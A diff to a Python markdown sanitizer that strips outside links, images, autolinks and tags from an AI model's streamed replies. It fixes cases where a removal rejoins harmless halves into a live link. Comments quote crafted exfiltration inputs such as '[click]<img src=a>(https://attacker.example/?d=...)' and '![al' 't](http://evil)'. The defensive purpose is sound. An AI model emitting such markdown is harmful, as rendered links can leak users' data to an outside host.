@@ -21,6 +21,15 @@ asks the model not to write either; this file is the guarantee that does not dep
    A link-reference definition (``[x]: https://...`` on its own line) is dropped the same way.
 3. Everything else is left byte for byte: ``[1]``, ``a < b``, ``arr[i](y)``, code, text. A
    backslash-escaped ``\\[`` is literal in markdown and is treated as literal here.
+4. **A removal never joins two halves into a construct** (found in step S5.2, D-100). The halves of
+   ``[click]<img src=a>(https://attacker.example/?d=...)`` are each harmless; with the tag removed they
+   became a live link to the outside. So where something was removed and the characters on both sides
+   of the hole are not white space, a blank line is put between them (no inline link, autolink, tag or
+   image can span one, and it is decided *before* the next construct is scanned, so that a
+   link-reference definition, which only counts at the start of a line, is judged where the reader will
+   see it). A space is enough, and is used, where the join would only make an opener (``<`` and ``img``,
+   ``!`` and ``[``). Prose is untouched: a removal between spaces needs nothing, and a link reduced to
+   its text keeps the full stop after it.
 
 **Streaming.** The reply arrives in pieces cut anywhere: ``![al`` and ``t](http://evil)`` can be
 two pieces, so cleaning each piece alone would let the whole through. ``StreamSanitizer`` therefore
@@ -53,6 +62,8 @@ _MAX_CONSTRUCT: Final = 4096
 _TAIL: Final = 32  # how much of the output is remembered, for escapes and line starts
 _SHOWN: Final = 200  # how much of a removed address is kept in the record
 
+_CHANGED: Final = 1  # the last output was a link reduced to its text
+_REMOVED: Final = 2  # the last output was a removal with nothing put in its place
 _NONE: Final = -1  # "this is not that construct": the opener is ordinary text
 _MORE: Final = -2  # "cannot tell yet": wait for more text
 _OVERFLOW: Final = -3  # "longer than _MAX_CONSTRUCT": escape the opener and move on
@@ -64,6 +75,12 @@ _TITLE: Final = re.compile(
     r"\"(?:[^\"\\]|\\.)*\"|'(?:[^'\\]|\\.)*'|\((?:[^()\\]|\\.)*\)", re.DOTALL
 )
 _NAME: Final = re.compile(r"[A-Za-z][A-Za-z0-9+.\-]*")
+# An autolink (``<scheme:...>``, no white space) or a tag (``<img ...>``, ``</p>``): spans that bind
+# tighter than a bracket pair, so brackets inside them are not the surrounding construct's brackets.
+_AUTOLINK_OR_TAG: Final = re.compile(r"<(?:[A-Za-z][A-Za-z0-9+.\-]*:[^\s<>]*|/?[A-Za-z][^<>]*)>")
+# The start of such a span that reaches the end of the text with no ``<`` or ``>`` yet: it may still be
+# completed by text that has not arrived.
+_OPEN_TAG: Final = re.compile(r"</?[A-Za-z][^<>]*\Z")
 _URL: Final = re.compile(r"https?://[^\s<>()\[\]\"'`]+")
 _DANGEROUS_TAGS: Final = frozenset(
     {
@@ -138,16 +155,40 @@ def _bracket_end(text: str, start: int, final: bool) -> int:
         if c == "\\":
             k += 2
             continue
+        if c == "<":
+            # An autolink or a tag binds tighter than a bracket in markdown: a "]" inside
+            # ``<IMG:]>`` belongs to the autolink, not to the "[" before it (found by hypothesis in
+            # S5.2: ``[<IMG:]>`` was read as a bracket pair and the autolink survived).
+            tag = _AUTOLINK_OR_TAG.match(text, k)
+            if tag is not None and tag.end() <= limit:
+                k = tag.end()
+                continue
+            if tag is None and not final and limit == len(text) and _OPEN_TAG.match(text, k):
+                # A tag that may still be completed by text that has not arrived: wait, or the result
+                # would depend on where the stream was cut.
+                return _MORE
         if c == "[":
             depth += 1
         elif c == "]":
             depth -= 1
             if depth == 0:
                 return k
-        elif c == "\n" and _BLANK_LINE.match(text, k):
+        elif c == "\n" and _blank_line_within(text, k, limit):
             return _NONE  # a paragraph break ends every inline construct
         k += 1
     return _undecided(text, start, final)
+
+
+def _blank_line_within(text: str, k: int, limit: int) -> bool:
+    """Does a blank line start at ``k`` and end inside the window that ends at ``limit``?
+
+    A blank line that crosses the end of the window is not counted: whether it was seen would
+    depend on how much of the text had arrived, and the cleaning of a reply must not depend on where
+    the stream was cut (found by hypothesis in S5.2 with a tiny window: ``[!!!!`` and two newlines).
+    The construct is then undecided at the cap, which escapes it: the safe outcome either way.
+    """
+    match = _BLANK_LINE.match(text, k)
+    return match is not None and match.end() <= limit
 
 
 def _paren_end(text: str, start: int, final: bool) -> int:
@@ -165,7 +206,7 @@ def _paren_end(text: str, start: int, final: bool) -> int:
         if c == "\\":
             k += 2
             continue
-        if c == "\n" and _BLANK_LINE.match(text, k):
+        if c == "\n" and _blank_line_within(text, k, limit):
             return _NONE
         if quote:
             if c == quote:
@@ -248,9 +289,23 @@ def _verdict(code: int) -> _Hit | None:
     return None
 
 
-def _clean_inner(text: str, allowed: Collection[str]) -> tuple[str, list[Removed]]:
-    """Clean text that sits inside a link's brackets (it can hold an image: a badge)."""
-    out, _, removed, _ = _process(text, True, allowed, "", False)
+def _clean_inner(
+    text: str, allowed: Collection[str], *, before: str = "[", after: str = "]"
+) -> tuple[str, list[Removed]]:
+    """Clean text that sits inside a link's brackets (it can hold an image: a badge).
+
+    The text has neighbours: ``before`` (the ``[`` in front of it) and ``after`` (the ``]`` behind
+    it). A removal at either end would join the neighbour to what lies on the other side of the hole,
+    so both are taken into account (found by hypothesis in S5.2: ``[<javascript:<img <http://e.x>](>``
+    cleaned its inside to ``<javascript:`` and the ``]`` that closes the construct then completed an
+    autolink). The rest of a definition line is cleaned the same way, with ``before="]"`` and nothing
+    after it.
+    """
+    out, _, removed, guard = _process(text, True, allowed, before, False)
+    # Nothing left of the text at all (a badge: ``[![x](u)](u)``) joins nothing: ``[`` and ``]`` side
+    # by side are only an empty pair.
+    if after and out.strip() and guard == _REMOVED and _joins_across_a_removal(before + out, after):
+        out += "\n\n"
     return out, removed
 
 
@@ -292,7 +347,14 @@ def _scan_link(text: str, p: int, final: bool, allowed: Collection[str], line_st
     close = _bracket_end(text, p, final)
     if (hit := _verdict(close)) is not None:
         return hit
-    cleaned, inner_removed = _clean_inner(text[p + 1 : close], allowed)
+    inside = text[p + 1 : close]
+    if "](" in inside and ")" not in inside.rsplit("](", 1)[1]:
+        # An inner link whose parenthesis is not closed inside this label: in markdown the inner
+        # ``[`` pairs with the first ``]`` and the link ends after this construct's own ``]``, so
+        # ``[[](])`` is a link to ``]`` that bracket matching from the outside never sees (found by
+        # hypothesis in S5.2). Make this ``[`` literal and read the inner one as its own construct.
+        return _Hit("replace", p + 1, "\\[", None)
+    cleaned, inner_removed = _clean_inner(inside, allowed)
     plain = "[" + cleaned + "]"
     after = close + 1
     if after >= len(text):
@@ -332,7 +394,21 @@ def _scan_link(text: str, p: int, final: bool, allowed: Collection[str], line_st
         address = _destination(text[after + 1 : line_end], strict=False)
         if _is_outside(address) and address not in allowed:
             return _Hit("replace", line_end, "", [_record("definition", address)])
-        return _Hit("replace", line_end, text[p:line_end], None)
+        # A definition that stays keeps its *cleaned* label and a cleaned rest of the line: with a safe
+        # (or empty) address it is not a definition at all as far as drawing goes, and an autolink or
+        # an image in the label of ``[<https://x>]:``, or an unfinished ``<img `` after the colon,
+        # would be drawn (found by hypothesis in S5.2; the raw line used to be kept).
+        line = text[after:line_end]
+        # The line break stays out of the cleaning: an unfinished tag would eat it and glue the next
+        # line to this one.
+        body = line.removesuffix("\n")
+        rest, rest_removed = _clean_inner(body, allowed, before="]", after="")
+        return _Hit(
+            "replace",
+            line_end,
+            plain + rest + line[len(body) :],
+            [*inner_removed, *rest_removed],
+        )
     return _Hit("replace", after, plain, inner_removed)
 
 
@@ -411,29 +487,68 @@ def _needs_gap(emitted: str, following: str) -> bool:
     return False
 
 
+def _joins_across_a_removal(emitted: str, following: str) -> bool:
+    """Is ``following`` glued to ``emitted`` with nothing between them, where a removal just was?
+
+    ``_needs_gap`` covers the two joins that make an opener. The rest are joins that *complete* a
+    construct whose halves were scanned apart (found by hypothesis and by hand in step S5.2):
+    ``[click]<img src=a>(https://attacker.example/?d=...)`` becomes ``[click](https://...)``, a live
+    link to the outside, and ``<IMGjavascript:<img >>`` becomes the autolink ``<IMGjavascript:>``.
+    Whenever the cleaning *removed* something and the characters on both sides of the hole are not
+    white space, the two sides are separated by a blank line: no inline link, no autolink, no tag
+    and no ``![`` can span a blank line, and neither can a link-reference definition, whose label
+    and address are otherwise happy to be joined by white space (``[x]:`` then ``https://...``): that
+    case is separated even when a space follows the colon. Prose is untouched: a removal between two
+    spaces (the usual case) needs nothing, and a link reduced to its text (which is *replaced*, not
+    removed) keeps the punctuation that follows it.
+    """
+    if not emitted or not following:
+        return False
+    if re.search(r"\]:[ \t]*$", emitted):
+        return True  # a definition's label is waiting for an address
+    return not emitted[-1].isspace() and not following[0].isspace()
+
+
 def _process(
-    text: str, final: bool, allowed: Collection[str], tail: str, at_start: bool, guard: bool = False
-) -> tuple[str, int, list[Removed], bool]:
+    text: str, final: bool, allowed: Collection[str], tail: str, at_start: bool, guard: int = 0
+) -> tuple[str, int, list[Removed], int]:
     """Clean as much of ``text`` as can be decided: (output, characters consumed, removals, guard).
 
     With ``final`` the whole text is consumed. Without it, scanning stops at the first opener whose
     construct is not yet decided (and a last ``!``, which may be half of ``![``), and everything before
     it has been output. ``tail`` is the end of what was output before this call (for escapes and line
-    starts); ``at_start`` says nothing but spaces was output yet. ``guard`` says the last thing
-    output was changed by cleaning, so what follows is checked for a new opener (``_needs_gap``);
-    the updated value is returned for the next call.
+    starts); ``at_start`` says nothing but spaces was output yet. ``guard`` says what happened to the
+    last thing output: ``0`` nothing, ``_CHANGED`` (a link was replaced by its text) or ``_REMOVED``
+    (something was removed and nothing put in its place), so what follows is checked for a new opener
+    (``_needs_gap``) and, after a removal, for a join that completes a construct
+    (``_joins_across_a_removal``); the updated value is returned for the next call.
     """
     out: list[str] = []
     removed: list[Removed] = []
     i = 0
     consumed = len(text)
 
-    def put(chunk: str, check: bool) -> None:
-        if chunk and check and _needs_gap(tail + "".join(out), chunk):
-            out.append(" ")
+    def junction(following: str, state: int) -> str:
+        """What goes between what was output and ``following``: nothing, a space or a blank line."""
+        if not state or not following:
+            return ""
+        emitted = tail + "".join(out)
+        if _needs_gap(emitted, following):
+            return " "
+        if state == _REMOVED and _joins_across_a_removal(emitted, following):
+            return "\n\n"
+        return ""
+
+    def put(chunk: str, state: int) -> None:
+        out.append(junction(chunk, state))
         out.append(chunk)
 
     while i < len(text):
+        if guard == _REMOVED:
+            # Decided before the next thing is scanned, not when it is output: a blank line makes the
+            # next character start a line, and the scan of a link-reference definition (which only
+            # counts at the start of a line) must see the text the way the reader will.
+            out.append(junction(text[i], guard))
         match = _OPENER.search(text, i)
         if match is None:
             rest = text[i:]
@@ -442,18 +557,18 @@ def _process(
                 consumed = len(text) - 1
             if rest:
                 put(rest, guard)
-                guard = False
+                guard = 0
             break
         p = match.start()
         if p > i:
             put(text[i:p], guard)
-            guard = False
+            guard = 0
         opener = match[0]
         emitted = tail + "".join(out)
         if _escaped(emitted):
             # "\![x](u)" is a "!" and then a link; "\[" and "\<" are just characters
             put("!" if opener == "![" else opener, guard)
-            guard = False
+            guard = 0
             i = p + 1
             continue
         if opener == "![":
@@ -467,16 +582,16 @@ def _process(
             break
         if hit.kind == "plain":
             put(opener, guard)
-            guard = False
+            guard = 0
             i = p + 1
         elif hit.kind == "overflow":
             put({"![": "!\\[", "[": "\\[", "<": "\\<"}[opener], guard)
-            guard = False
+            guard = 0
             i = p + len(opener)
         else:
             changed = hit.text != text[p : hit.end]
-            put(hit.text, changed or guard)
-            guard = changed
+            put(hit.text, guard or (_CHANGED if changed else 0))
+            guard = (_REMOVED if not hit.text else _CHANGED) if changed else 0
             removed.extend(hit.removed or [])
             i = hit.end
     return "".join(out), consumed, removed, guard
@@ -502,7 +617,7 @@ class StreamSanitizer:
         self._pending = ""
         self._tail = ""
         self._at_start = True
-        self._guard = False
+        self._guard = 0
         self._removed: list[Removed] = []
 
     @property
